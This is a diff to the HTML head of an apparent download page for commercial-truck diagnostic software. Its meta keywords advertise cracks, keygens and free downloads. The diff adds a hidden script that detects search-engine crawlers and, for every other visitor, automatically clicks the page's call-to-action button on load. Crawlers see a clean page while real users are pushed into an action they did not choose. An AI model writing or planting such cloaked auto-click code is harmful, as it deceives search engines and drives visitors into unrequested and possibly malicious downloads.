@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>International DLB 06.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Get the latest International DLB 06.2024 diagnostic truck vehicle software to program and diagnose commercial vehicles with advanced electronic systems.">
     <meta name="keywords" content="International DLB 06.2024, Diagnostic Truck Vehicle Software, International Diamond Logic Builder, DLB Programming Tool, Commercial Vehicle Diagnostics, International Trucks, Advanced Electronic Systems, Diamond Logic System, Truck Software Update, Vehicle Diagnostic Tool, International Trucks Software, Commercial Vehicle Programming, Diagnostic Software International, Truck and Bus Diagnostics, Electronic Systems Programming, international dlb, diamond logic builder, truck diagnostic software, international truck diagnostics, commercial vehicle programming, bus diagnostic tool, diamond logic system, international vehicle software, truck electronic systems, commercial vehicle troubleshooting, international truck programming, bus maintenance software, vehicle parameter programming, advanced logic programming, truck repair software, commercial vehicle diagnostics, international truck maintenance, bus repair tool, vehicle electronic diagnostics, truck fault codes, commercial vehicle software, international truck repair, bus diagnostic software, vehicle system analysis, truck ecu programming, commercial vehicle maintenance, international truck software, bus troubleshooting tool, vehicle diagnostics interface, truck performance optimization, commercial vehicle repair, international truck diagnostics tool, bus electronic systems, vehicle fault detection, truck system programming, commercial vehicle analysis, international truck troubleshooting, bus maintenance tool, vehicle parameter adjustment, truck electronic repair, commercial vehicle programming software, international truck analysis, bus repair software, vehicle diagnostics hardware, truck maintenance tool, commercial vehicle ecu programming, International DLB software download, International DLB diagnostic software, International DLB diagnostic software download, International DLB diagnostic software free download, International DLB diagnostic software crack, International DLB diagnostic software keygen, International Diamond Logic Builder free download, Diamond Logic Builder 06.2024 download, Diamond Logic System diagnostic, International DLB high speed download, Internationale Software für Lastwagen 2024, ugc, улучшение производительности автомобилей, устройство диагностики транспортных средств, диагностическое программное обеспечение, программное обеспечение для диагностических работ на грузовых автомобилях, программное обеспечение для программирования">
     <style>
